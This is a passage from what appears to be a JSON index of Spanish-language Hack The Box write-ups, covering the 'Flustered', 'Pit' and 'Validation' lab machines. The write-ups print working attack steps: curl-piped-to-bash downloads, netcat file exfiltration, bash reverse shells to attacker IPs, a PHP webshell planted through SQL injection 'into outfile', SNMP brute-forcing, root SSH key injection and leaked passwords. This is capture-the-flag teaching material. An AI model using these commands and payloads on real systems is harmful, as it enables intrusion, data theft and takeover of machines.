bash\\&quot;)}}{%endif%}{%endfor%}&quot;}&#39;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;504 Gateway Time-out&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body bgcolor=&quot;white&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;504 Gateway Time-out&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx/1.14.2&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; Estamos haciendo un curl a nuestro servidor de python y luego lo pipeamos con la bash curl 10.10.16.8 | bash.Acceso a la maquina.Ya estamos dentro de la maquina victima. Ahora vamos a obtener acceso al usuario jennifer para capturar la flag de user.Si recordamos, el vol1 no podiamos montarlo ya que no teniamos los ficheros ssl, ahora podremos enviarlos a nuestra maquina para montar el vol1:┌─[root@h4cknet]─[~]└──╼ #cd /etc/ssl┌─[root@h4cknet]─[~]└──╼ #nc -nvlp 443 &amp;gt; glusterfs.cawww-data@flustered:/etc/ssl$ nc 10.10.16.8 443 &amp;lt; glusterfs.caHariamos todo igual para cada fichero(.key y .pem).Montamos el vol1:mount -t glusterfs 10.10.11.131:/vol1 /mnt/flustered/Encontramos el directorio de jennifer, con lo cual, podemos ver la flag. Ademas podemos añadir nuestra clave publica de ssh para conectarnos.┌─[root@h4cknet]─[~]└──╼ #ssh-keygen ┌─[root@h4cknet]─[~]└──╼ #cat .ssh/id_rsa.pub | tr -d &#39;\\n&#39; | xclip -sel clip┌─[root@h4cknet]─[/mnt/flustered]└──╼ #cd /mnt/flustered┌─[root@h4cknet]─[/mnt/flustered]└──╼ #nano .ssh/authorized_keysCTRL+SHIFT+V Guardamos y nos conectamos.Escalar privilegios.jennifer@flustered:~$ hostname -I10.10.11.131 172.17.0.1 dead:beef::250:56ff:feb9:4e03jennifer@flustered:~$ ip a1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:b9:4e:03 brd ff:ff:ff:ff:ff:ff inet 10.10.11.131/24 brd 10.10.11.255 scope global eth0 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:feb9:4e03/64 scope global dynamic mngtmpaddr valid_lft 86398sec preferred_lft 14398sec inet6 fe80::250:56ff:feb9:4e03/64 scope link valid_lft forever preferred_lft forever3: docker0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:e0:90:c0 brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever inet6 fe80::42:acff:fee0:90c0/64 scope link valid_lft forever preferred_lft forever5: veth61376bc@if4: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue master docker0 state UP group default link/ether aa:f7:ab:2b:9c:6f brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet6 fe80::a8f7:abff:fe2b:9c6f/64 scope link valid_lft forever preferred_lft foreverTenemos un docker corriendo en la ip 172.17.0.1. No podemos listar las imagenes ni los contenedores porque no disponemos de permisos.Vamos a fuzzear activos validos. Nos crearemos un script en bash que realizara un ping a un rango de ips.#!/bin/bashfor ip in $(seq 1 254); do timeout 1 bash -c &quot;ping -c 1 172.17.0.$ip&quot; &amp;amp;&amp;gt;/dev/null &amp;amp;&amp;amp; echo &quot;HOST 172.17.0.$ip esta activo&quot; &amp;amp;done; waitLanzamos el script:jennifer@flustered:/tmp$ ./hostDiscovery.sh HOST 172.17.0.1 esta activoHOST 172.17.0.2 esta activoTenemos una nueva ip. Ahora vamos a escanear sus puertos abiertos. Creamos otro script parecido al anterior:#!/bin/bashfor puerto in $(seq 1 65535); do timeout 1 bash -c &quot;echo &#39;&#39; &amp;gt; /dev/tcp/172.17.0.2/$puerto&quot; 2&amp;gt;/dev/null &amp;amp;&amp;amp; echo &quot;Puerto $puerto abierto&quot; &amp;amp;done; waitLanzamos el script:jennifer@flustered:/tmp$ ./portDiscovery.sh Puerto 10000 abiertoNos detecta el puerto 10000. No sabemos que hay detras de este puerto. Probamos a lanzar un curl para saber si es http:jennifer@flustered:/tmp$ curl http://172.17.0.2:10000&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&amp;gt;&amp;lt;Error&amp;gt; &amp;lt;Code&amp;gt;InvalidQueryParameterValue&amp;lt;/Code&amp;gt; &amp;lt;Message&amp;gt;Value for one of the query parameters specified in the request URI is invalid.RequestId:48e57e82-88ed-4963-b35d-bb53b272626aTime:2022-02-16T19:52:33.342Z&amp;lt;/Message&amp;gt;Parece que si es http. Nos traemos el puerto 10000 de la maquina victima a la nuestra para escanearlo mejor. Esto lo hacemos con port forwarding a traves de ssh:ssh -L 10000:172.17.0.2:10000 jennifer@10.10.11.131En el anterior comando le estamos indicando que el puerto 10000 de la maquina victima (en este caso, el docker) sea nuestro puerto 10000 local.Nos muestra el codigo InvalidQueryParameterValue. Buscamos en internet que es, y vemos algo de Microsoft Azure. Hay un explorador de almacenamiento de azure, lo utilizaremos desde ubuntu ya que en Parrot OS da problemas.Estando ya en ubuntu, nos instalamos lo siguiente: sudo apt install snapd sudo snap install storage-explorer storage-explorer &amp;gt; Nos dara un error, le tenemos que dar clic a copy command and quit y pegamos el comando que nos ha copiado. Despues de esto volvemos a ejecutar storage-explorer. En Seleccionar recurso seleccionamos Emulador de almacenamiento local y nos aparece lo siguiente:Nombre de la cuenta: jenniferClave de cuenta: La encontramos ejecutando en la raiz de la maquina victima find \\-name key 2&amp;gt;/dev/null y nos reporta /var/backups/key.Nos conectamos y vemos la clave privada de ssh del usuario root:Nos creamos un archivo llamado id_rsa en nuestro equipo con esa clave y le asignamos permisos chmod 600 id_rsa para realizar la conexion por ssh:ssh -i id_rsa root@10.10.11.131Visualizamos flag de root!!!Exploits y contenido: En mi github encontraras el script autopwn.py y los archivos de reconocimiento." }, { "title": "HTB - Pit", "url": "/posts/pit/", "categories": "HTB", "tags": "Information Leakage, SNMP Enumeration, SeedDMS, SNMP Code Execution", "date": "2022-02-09 00:00:00 +0100", "snippet": "Resolución detallada de la maquina Pit. Veremos las siguientes técnicas: Information leakage SNMP Enumeration Abusing SeedDMS SNMP Code ExecutionReconocimiento.Comprobación conexión y TTL.Realizamos un ping a la maquina victima para comprobar que tenemos traza ICMP y averiguar el S.O mediante el TTL:ping -c 1 10.10.10.241Tenemos conexión y estamos ante una maquina linux.Escaneo de puertos.Utilizaremos nmap para escanear todos los puertos que tiene abiertos la maquina victima:┌─[root@h4cknet]─[/home/w0lfst/HTB/Pit]└──╼ # nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.241 -oG allPortsStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-10 21:53 CETInitiating SYN Stealth Scan at 21:53Scanning 10.10.10.241 [65535 ports]Discovered open port 22/tcp on 10.10.10.241Discovered open port 80/tcp on 10.10.10.241Discovered open port 9090/tcp on 10.10.10.241Completed SYN Stealth Scan at 21:54, 26.36s elapsed (65535 total ports)Nmap scan report for 10.10.10.241Host is up, received user-set (0.066s latency).Scanned at 2022-02-10 21:53:41 CET for 26sNot shown: 65500 filtered tcp ports (no-response), 32 filtered tcp ports (admin-prohibited)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 639090/tcp open zeus-admin syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 26.47 seconds Raw packets sent: 131048 (5.766MB) | Rcvd: 35 (2.436KB) En mis apuntes encontraras mas detalladamente que hace cada parámetro del comando.Escaneo de servicios que corren cada puerto.┌─[root@h4cknet]─[/home/w0lfst/HTB/Pit]└──╼ #nmap -sCV -p22,80,9090 10.10.10.241 -oN targetedStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-10 21:55 CETNmap scan report for 10.10.10.241Host is up (0.071s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (protocol 2.0)| ssh-hostkey: | 3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)| 256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)|_ 256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)80/tcp open http nginx 1.14.1|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux|_http-server-header: nginx/1.14.19090/tcp open ssl/zeus-admin?| fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.1 400 Bad request| Content-Type: text/html; charset=utf8| Transfer-Encoding: chunked| X-DNS-Prefetch-Control: off| Referrer-Policy: no-referrer| X-Content-Type-Options: nosniff| Cross-Origin-Resource-Policy: same-origin| &amp;lt;!DOCTYPE html&amp;gt;| &amp;lt;html&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;title&amp;gt;| request| &amp;lt;/title&amp;gt;| &amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&amp;gt;| &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&amp;gt;| &amp;lt;style&amp;gt;| body {| margin: 0;| font-family: &quot;RedHatDisplay&quot;, &quot;Open Sans&quot;, Helvetica, Arial, sans-serif;| font-size: 12px;| line-height: 1.66666667;| color: #333333;| background-color: #f5f5f5;| border: 0;| vertical-align: middle;| font-weight: 300;|_ margin: 0 0 10p| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1| Not valid before: 2020-04-16T23:29:12|_Not valid after: 2030-06-04T16:09:12|_ssl-date: TLS randomness does not represent time1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : Puerto Servicio Version 22 ssh OpenSSH 8.0 80 http nginx 1.14.1 9090 ssl/zeus-admin? - El escaneo nos reporta un dominio dms-pit.htb:ssl-cert: Subject: commonName=dms-pit.htb/Examinando certificado ssl.Vamos a examinar el certificado https que tiene el puerto 9090:┌─[root@h4cknet]─[/home/w0lfst/HTB/Pit]└──╼ #openssl s_client -connect 10.10.10.241:9090CONNECTED(00000003)Can&#39;t use SSL_get_servernamedepth=0 C = US, O = 4cd9329523184b0ea52ba0d20a1a6f92, CN = dms-pit.htbverify error:num=20:unable to get local issuer certificateverify return:1depth=0 C = US, O = 4cd9329523184b0ea52ba0d20a1a6f92, CN = dms-pit.htbverify error:num=21:unable to verify the first certificateverify return:1depth=0 C = US, O = 4cd9329523184b0ea52ba0d20a1a6f92, CN = dms-pit.htbverify return:1---Certificate chain 0 s:C = US, O = 4cd9329523184b0ea52ba0d20a1a6f92, CN = dms-pit.htb i:C = US, O = 4cd9329523184b0ea52ba0d20a1a6f92, OU = ca-5763051739999573755, CN = dms-pit.htb---Server certificate-----BEGIN CERTIFICATE-----MIIEpjCCAo6gAwIBAgIISl2h4yex5dEwDQYJKoZIhvcNAQELBQAwbzELMAkGA1UEBhMCVVMxKTAnBgNVBAoMIDRjZDkzMjk1MjMxODRiMGVhNTJiYTBkMjBhMWE2ZjkyMR8wHQYDVQQLDBZjYS01NzYzMDUxNzM5OTk5NTczNzU1MRQwEgYDVQQDDAtkbXMtcGl0Lmh0YjAeFw0yMDA0MTYyMzI5MTJaFw0zMDA2MDQxNjA5MTJaME4xCzAJBgNVBAYTAlVTMSkwJwYDVQQKDCA0Y2Q5MzI5NTIzMTg0YjBlYTUyYmEwZDIwYTFhNmY5MjEUMBIGA1UEAwwLZG1zLXBpdC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDZLaNRUf3BXYCd+Df9XZwMBmIwGzy/yX+9fPY6zGXYEYS7SeH9xZ7pGTUQMfk30Olb7rzftCKx9xSMHyoCJIAWFeVDV9vxJbGaEqFRvKHPeqcpQbRAKoqLxWaqbDZCXsBtTVYEwpRHvJ/GoGEWAQSbP1zkHzvVBkHuXE7Sj0zlW5NaBjvG/wEewAB6crwnIYoqC550cMPritvjLwijk9nhwaPJ462anhJR5vFBvkR4nqD3mhIytUObYMsfVoI0FiXtlBdu1ApABxtIdQgkY94eRAaMTkQ4Je0a8G5PlRZ20xCdqHb3xIZV1mphZehkUeN0MzgEloL5TX8Zab+LZW+ZAgMBAAGjZzBlMA4GA1UdDwEB/wQEAwIFoDAJBgNVHRMEAjAAMCcGA1UdEQQgMB6CC2Rtcy1waXQuaHRigglsb2NhbGhvc3SHBH8AAAEwHwYDVR0jBBgwFoAUc8ssOet8O2a3+F2If4eQixSV7PwwDQYJKoZIhvcNAQELBQADggIBAG8kou51q78wdzxiPejMv9qhWlBWW3Ly5TvAav07ATx8haldEHvTLlFNGPDFAvJvcKguiHnGrEL9Im5GDuzi31V4fE5xjzWJdkepXasK7NzIciC0IwgP7G1j11OUJOt9pmDRu2FkTHsSdr5b57P4uXS8rRF5lLCEafuemk6ORXa07b9xSrhC3pWl22RtVlTFQ3wX8OsY0O3w5UUz8T/ezhKYUoM/mYQu+ICTAltlX4xae6PGauChuaOY+/dPtM17KfHSbnCS1ZnR0oQ4BXJuYNfOR/C59L5B7TWzaOx5n1TD6JHOzrDuLxjO0OTeFaBRXL/s2Z5zNPTpZVnHyKEmHr5ZObjR6drDGqXfShPq5y70RfE28PxmVTCdK4MCqDkELIlXrxzHQ/IPC8pxho6WEQsY80xZ1nXbLshlymh6clgblOetToZTHObIkEoPBtszUssFmWSN5hd4JcuyqSbJhichYtFQRASb2I4jWdP831LPir+MCGQviAnieBF8zYus7kboTwfXmBGUt6r6eNE1yr4ZXPxOZoWq2ob6aAeLp2mqif+jgUSkfiG9oiAoyXWxw5pLfYHxVQGY+rGbjOs8gCAxBaTPt6dCkHZy/nU8PNZtV6QC4OMELI/sYtmG8XENdQhsLM2sewOMvv5rgsZ8SlX05Bw8C1xuq5Rg1KewCjlY-----END CERTIFICATE-----subject=C = US, O = 4cd9329523184b0ea52ba0d20a1a6f92, CN = dms-pit.htbissuer=C = US, O = 4cd9329523184b0ea52ba0d20a1a6f92, OU = ca-5763051739999573755, CN = dms-pit.htb---No client certificate CA names sentPeer signing digest: SHA256Peer signature type: RSA-PSSServer Temp Key: X25519, 253 bits---SSL handshake has read 1750 bytes and written 363 bytesVerification error: unable to verify the first certificate---New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384Server public key is 2048 bitSecure Renegotiation IS NOT supportedCompression: NONEExpansion: NONENo ALPN negotiatedEarly data was not sentVerify return code: 21 (unable to verify the first certificate)---closedAquí también podemos ver el dominio dms-pit.htb.Vamos a añadirlo al /etc/hosts y ponemos en el navegador el dominio. El resultado es 403 forbidden.Escaneando puertos UDP.Analizando los subdirectorios no encontramos nada. Asi que vamos a analizar los puertos udp:┌─[root@h4cknet]─[/home/w0lfst/HTB/Pit]└──╼ #nmap -sU --top-ports 100 --open -v -n 10.10.10.241 -oG top100udpStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-10 22:46 CETInitiating Ping Scan at 22:46Scanning 10.10.10.241 [4 ports]Completed Ping Scan at 22:46, 0.17s elapsed (1 total hosts)Initiating UDP Scan at 22:46Scanning 10.10.10.241 [100 ports]Discovered open port 161/udp on 10.10.10.241UDP Scan Timing: About 46.89% done; ETC: 22:47 (0:00:35 remaining)Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing UDP ScanUDP Scan Timing: About 79.67% done; ETC: 22:47 (0:00:17 remaining)Completed UDP Scan at 22:47, 101.27s elapsed (100 total ports)Nmap scan report for 10.10.10.241Host is up (0.081s latency).Not shown: 99 filtered udp ports (admin-prohibited)PORT STATE SERVICE161/udp open snmpRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 101.56 seconds Raw packets sent: 270 (16.691KB) | Rcvd: 109 (8.942Nos reporta el puerto SNMP (Protocolo simple de gestión de red.). Esto nos permitirá enumerar información de la maquina.Aplicando fuerza bruta y snmp.Utilizaremos un diccionario de SecLists y la herramienta onesixtyone. Con esto vamos a aplicar fuerza bruta sobre el host y detectar community strings validas.┌─[✗]─[root@h4cknet]─[/home/w0lfst/HTB/Pit]└──╼ #onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/snmp.txt 10.10.10.241Scanning 1 hosts, 3220 communities10.10.10.241 [public] Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_6410.10.10.241 [public] Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_64Public es una community string correcta. De forma que ahora podemos utilizar snmpwalk para ver información de la maquina.Antes de ejecutar snmpwalk vamos a instalarnos snmp-mibs-downloader y modificar /etc/snmp/snmp.conf, comentamos el mibs : con un #, guardamos y ejecutamos snmpbulkwalk:snmpbulkwalk -v2c -c public 10.10.10.241No encontramos nada interesante. Probaremos a escanear desde la raíz indicando 1 en el OID:snmpbulkwalk -v2c -c public 10.10.10.241 1Ahora si!!Analizando todo lo que reporta, vemos lo siguiente: Usuario: michelle Ruta: /var/www/html/seeddms51x/seeddmsVamos a probar la ruta en el dominio https://dms-pit.htb:Introducimos el usuario michelle y contraseña michelle. Estamos dentro!!Explotación.Buscando vulnerabilidad.Buscamos alguna vulnerabilidad en exploit-db.com. Utilizare la herramienta searchsploit:┌─[root@h4cknet]─[/home/w0lfst/HTB/Pit/exploits]└──╼ #searchsploit seeddms------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated) | php/webapps/50062.pySeedDMS 5.1.18 - Persistent Cross-Site Scripting | php/webapps/48324.txtSeedDMS &amp;lt; 5.1.11 - &#39;out.GroupMgr.php&#39; Cross-Site Scripting | php/webapps/47024.txtSeedDMS &amp;lt; 5.1.11 - &#39;out.UsrMgr.php&#39; Cross-Site Scripting | php/webapps/47023.txtSeedDMS versions &amp;lt; 5.1.11 - Remote Command Execution | php/webapps/47022.txt------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------Visualizamos el siguiente:searchsploit -x php/webapps/47022.txtExplotando vulnerabilidad.Estos son los pasos que nos indica:Step 1: Login to the application and under any folder add a document.Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.PHP Backdoor Code:&amp;lt;?php system($_REQUEST[&#39;cmd&#39;]);?&amp;gt;Step 3: Now after uploading the file check the document id corresponding to the document.Step 4: Now go to example.com/data/1048576/&quot;document_id&quot;/1.php?cmd=cat+/etc/passwd to get the command response in browser.Después de seguir los pasos anteriores tendremos ejecución de comandos remotamente, para poder ejecutar los comandos de manera mas cómoda utilizaremos la herramienta ttyovertthp hecha por s4vitar.Recuerda : Modifica la variable main_url por tu id de documento y nombre del php.Vemos un archivo de configuración con credenciales en ../../conf/settings.xml/&amp;lt;database dbDriver=&quot;mysql&quot; dbHostname=&quot;localhost&quot; dbDatabase=&quot;seeddms&quot; dbUser=&quot;seeddms&quot; dbPass=&quot;ied^ieY6xoquu&quot; doNotCheckVersion=&quot;false&quot;&amp;gt;Vamos a probar la contraseña ied^ieY6xoquu en el panel http://pit.htb:9090 con el usuario michelle…Estamos dentro!!Flag de usuario.Hay un apartado que llama la atención Terminal:Acceso a la maquina.Vamos a enviarnos una bash a nuestra maquina. Nos ponemos en escucha por el puerto 443:nc -nvlp 443Y enviamos la bash:bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.7/443 0&amp;gt;&amp;amp;1&quot;Tratamos la tty:[michelle@pit ~]$ script /dev/null -c bashScript started, output log file is &#39;/dev/null&#39;.[michelle@pit ~]$ ^Z[1]+ Stopped nc -nvlp 443w0lfst@h4cknet:~$ stty raw -echo; fgnc -nvlp 443 reset xterm[michelle@pit ~]$ export TERM=xterm[michelle@pit ~]$ export SHELL=bash[michelle@pit ~]$ stty rows X colums XEscalando privilegios.Anteriormente vimos la ejecución de un script /usr/bin/monitor. Vamos a ver que contiene:[michelle@pit ~]$ cat /usr/bin/monitor #!/bin/bashfor script in /usr/local/monitoring/check*shdo /bin/bash $scriptdoneEl script ejecuta con bash cualquier script que contenga check y termine en .sh. Nos dirigimos a la ruta /usr/local/monitoring pero no tenemos permiso para visualizar el directorio. Vamos a ver que permisos hay asignados a la carpeta:[michelle@pit local]$ ls -la monitoringtotal 0drwxrwx---+ 2 root root 122 Feb 10 19:15 monitoringVemos un + asi que seguramente tenga permisos avanzados:[michelle@pit local]$ getfacl monitoring/# file: monitoring/# owner: root# group: rootuser::rwxuser:michelle:-wxgroup::rwxmask::rwxother::---El usuario michelle tiene permisos para escribirCreando script.Nos crearemos un script nuevo:vi checkw0lfst.sh#!/bin/bashecho &#39;tu-clave-publica&#39; &amp;gt; /root/.ssh/authorized_keysEsto copiara nuestra clave publica a las autorizadas del usuario root y conseguiremos acceder por ssh mediante nuestra clave privada sin necesidad de contraseña.Para forzar la ejecución del comando /usr/local/monitoring tenemos que lanzar lo siguiente en nuestra maquina:snmpwalk -v2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjectsY realizar la conexión por ssh:ssh root@pit.htbVisualizamos la flag y listo!!Exploits y contenido: En mi github encontraras el script autopwn.py y los archivos de reconocimiento." }, { "title": "HTB - Validation", "url": "/posts/validation/", "categories": "HTB", "tags": "SQLi, Information Leakage", "date": "2022-02-03 00:00:00 +0100", "snippet": "Veremos las siguientes técnicas a lo largo de la resolución: SQLI (Error Based). SQLI - RCE (into outfile). Information Leakage.ReconocimientoComprobacion conexion y TTLRealizamos un ping a la maquina victima para comprobar que tenemos traza ICMP y averiguar el S.O mediante el TTL:ping -c 1 10.10.11.116 -c Cantidad de paquetes que queremos enviar. S.O Linux Windows TTL &amp;gt;64 &amp;gt;128 Escaneo de puertosUtilizaremos nmap para escanear todos los puertos que tiene abiertos la maquina victimaw0lfst@h4cknet:~$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.116 -oG &quot;allPorts&quot;# Nmap 7.92 scan initiated Thu Feb 3 23:00:50 2022 as: nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allPorts 10.10.11.116# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10.10.11.116 () Status: UpHost: 10.10.11.116 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 4566/open/tcp//kwtc///, 8080/open/tcp//http-proxy///# Nmap done at Thu Feb 3 23:01:00 2022 -- 1 IP address (1 host up) scanned in 10.23 seconds En mis apuntes encontraras mas detalladamente que hace cada parametro del comando.Escaneo servicios que corren cada puertow0lfst@h4cknet:~$ nmap -sCV -p22,80,4566,8080 10.10.11.116 -oN targeted# Nmap 7.92 scan initiated Thu Feb 3 23:07:55 2022 as: nmap -sCV -p22,80,4566,8080 -oN targeted 10.10.11.116Nmap scan report for 10.10.11.116Host is up (0.043s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)| 256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)|_ 256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)80/tcp open http Apache httpd 2.4.48 ((Debian))|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).|_http-server-header: Apache/2.4.48 (Debian)4566/tcp open http nginx|_http-title: 403 Forbidden8080/tcp open http nginx|_http-title: 502 Bad GatewayService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Feb 3 23:08:22 2022 -- 1 IP address (1 host up) scanned in 26.85 seconds Puerto Servicio Version 22 ssh OpenSSH 8.2p1 80 http Apache httpd 2.4.48 4566 kwtc nginx 8080 http nginx Analizando puerto 80w0lfst@h4cknet:~$ whatweb http://10.10.11.116http://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]En la web encontramos un registro que nos pide nuestro usuario y el país, podemos añadir todo lo que queramos.Probamos inyecciones en el campo username: Tipo Inyección HTML &amp;lt;h1&amp;gt;Hola&amp;lt;/h1&amp;gt; XSS &amp;lt;script&amp;gt;alert(&quot;hola&quot;)&amp;lt;/script&amp;gt; Funcionan todas pero no podemos hacer nada porque no hay ningún tipo de autenticación.Probamos también inyección sql admin&#39; pero no vemos nada. Asi que utilizaremos BurpSuite para inyectar sql en el campo del país.Inyeccion SQLiBurpsuiteAbrimos Burpsuite e interceptamos la petición. Pulsamos CTRL + R para enviarla al repeater.Probamos las siguientes inyecciones: SQLi Respuesta username=admin&amp;amp;country=Brazil&#39; union select 1-- - 1 username=admin&amp;amp;country=Brazil&#39; union select database()-- - registration username=admin&amp;amp;country=Brazil&#39; union select version()-- - 10.5.11-MariaDB-1 Vamos a ver las bases de datos que hay en el servidor:username=admin&amp;amp;country=Brazil&#39; union select schema_name from information_schema.schemata-- -Nos reporta las siguientes bases de datos: information_schema performance_schema mysql registrationVeamos que encontramos en la base de datos registration: Utilidad SQLi Respuesta Tablas username=admin&amp;amp;country=Brazil&#39; union select table_name from information_schema.tables where table_schema=&quot;registration&quot;-- - registration Columnas username=admin&amp;amp;country=Brazil&#39; union select column_name from informaction_shema.columns where table_schema=&quot;registration&quot; and table_name=&quot;registration&quot;-- - username, userhash, country, regtime Enumeración username=admin&amp;amp;country=Brazil&#39; union select group_concat(username,0x3a,userhash) from registration-- - admin:212321297a57a5a743894a0e4a801fc3 Esto no servirá ya que son usuarios que hemos añadido nosotros anteriormente. Asi que probaremos a depositar archivos con SQLi.username=admin&amp;amp;country=Brazil&#39; union select &quot;probando&quot; into outfile &quot;/var/www/html/prueba.txt&quot;-- -Vamos a http://10.10.11.116/prueba.txt y nos mostrara lo que hemos escrito “probando”. Ahora introduciremos código php para poder ejecutar comandos remotamente.username=admin&amp;amp;country=Brazil&#39; union select &quot;&amp;lt;?php system($_REQUEST[&#39;cmd&#39;]);?&amp;gt;&quot; into outfile &quot;/var/www/html/w0lfst.php&quot;-- -Ponemos la siguiente url http://10.10.11.116/w0lfst.php?cmd=whoami y nos responderá con el nombre usuario “www-data”. Con esto, confirmamos que podemos ejecutar comandos de manera remota.AccesoObtener acceso remoto.Nos ponemos en escucha por el puerto que queramos, por ejemplo, 8080:nc -nvlp 8080Lanzamos un curl:curl 10.10.11.116/w0lfst.php --data-urlencode &#39;cmd=bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/tu-ip/tu-puerto 0&amp;gt;&amp;amp;1&quot;&#39;En la ventana que hemos ejecutado el nc -nvlp 8080 recibiremos una terminal. Vamos a hacer un tratamiento de la tty.www-data@validation:/var/www/html:~$ script /dev/null -c bashScript started, output log file is &#39;/dev/null&#39;.www-data@validation:/var/www/html$ ^Z[1]+ Stopped nc -nvlp 8080w0lfst@h4cknet:~$ stty raw -echo; fgnc -nvlp 8080 reset xtermwww-data@validation:/var/www/html:~$ export TERM=xtermwww-data@validation:/var/www/html:~$ export SHELL=bashwww-data@validation:/var/www/html:~$ stty rows X colums X En x ponemos el numero que te corresponda según tu terminal. Para saber como ver tu tamaño mira esto.En /home/htb/user.txt vemos la flag de usuario.Escalada de privilegiosAnalizamos que archivos hay en /var/www/html y encontramos un config.php:www-data@validation:/var/www/html:~$ cat config.php&amp;lt;?php $servername = &quot;127.0.0.1&quot;; $username = &quot;uhc&quot;; $password = &quot;uhc-9qual-global-pw&quot;; $dbname = &quot;registration&quot;; $conn = new mysqli($servername, $username, $password, $dbname);?&amp;gt;Encontramos una contraseña uhc-9qual-global-pw. Vamos a probar si funciona con el usuario root:www-data@validation:/var/www/html$ su rootPassword: root@validation:~#La contraseña es valida. Visualizamos la flag de root.txt y ya estaría todo!! Exploits y contenido: En mi github encontraras el script autopwn.py y los archivos de reconocimiento." } ]
